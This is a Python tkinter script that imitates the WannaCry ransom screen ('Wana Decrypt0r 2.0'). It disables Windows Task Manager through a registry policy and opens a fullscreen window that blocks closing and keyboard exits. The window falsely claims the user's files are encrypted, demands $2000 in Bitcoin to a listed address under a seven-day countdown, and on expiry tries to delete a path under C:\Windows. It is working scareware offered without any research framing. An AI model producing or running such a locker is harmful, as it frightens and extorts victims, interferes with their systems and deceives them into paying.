import tkinter as tk
import os
import ctypes
import sys
import time
import subprocess
import winreg

# === SETTINGS ===
FAKE_FILE_PATH = r"C:\Windows\System32"
BITCOIN_ADDR = "bc1qpdkwjy7p0zrr9ggtnlxvczctjftl9wlrtfhq6a"
TOTAL_SECONDS = 7 * 24 * 60 * 60  # 7 days

# === PREVENT TASK MANAGER ===
def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                             0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

# === RESTORE TASK MANAGER (optional) ===
def enable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except PermissionError:
        pass

# === FORMAT TIMER ===
def format_time(seconds):
    d = seconds // (24 * 3600)
    seconds %= (24 * 3600)
    h = seconds // 3600
    seconds %= 3600
    m = seconds // 60
    s = seconds % 60
    return f"{d}d {h}h {m}m {s}s"

# === DELETE FILE ===
def delete_fake_file():
    if os.path.exists(FAKE_FILE_PATH):
        try:
            os.remove(FAKE_FILE_PATH)
        except Exception:
            pass

# === COUNTDOWN ===
def countdown(sec):
    if sec >= 0:
        timer_label.config(text=f"Time Left: {format_time(sec)}")
        root.after(1000, countdown, sec - 1)
    else:
        timer_label.config(text="Time Expired.")
        message_label.config(text="Your files are gone!")
        delete_fake_file()

# === FAKE PAY BUTTON ===
def fake_pay():
    msg_label.config(text="Waiting for confirmation from blockchain...\nStill encrypted.")

root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.title("Wana Decrypt0r 2.0")

# Disable closing window
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Escape>", lambda e: "break")

message_label = tk.Label(
    root,
    text="!!! YOUR FILES HAVE BEEN ENCRYPTED !!!",
    font=("Arial Black", 32, "bold"),
    fg="red",
    bg="black"
)
message_label.pack(pady=50)

timer_label = tk.Label(
    root,
    text="",
    font=("Consolas", 24, "bold"),
    fg="orange",
    bg="black"
)
timer_label.pack(pady=10)

btc_label = tk.Label(
    root,
    text=f"Send $2000 worth of BTC to:\n{BITCOIN_ADDR}",
    font=("Courier", 20, "bold"),
    fg="white",
    bg="black"
)
btc_label.pack(pady=40)

pay_button = tk.Button(
    root,
    text="PAY",
    font=("Arial", 20, "bold"),
    fg="white",
    bg="red",
    padx=30,
    pady=10,
    command=fake_pay
)
pay_button.pack()

msg_label = tk.Label(
    root,
    text="Decrypt key not received.",
    font=("Consolas", 16),
    fg="gray",
    bg="black"
)
msg_label.pack(pady=20)

countdown(TOTAL_SECONDS)
root.mainloop()
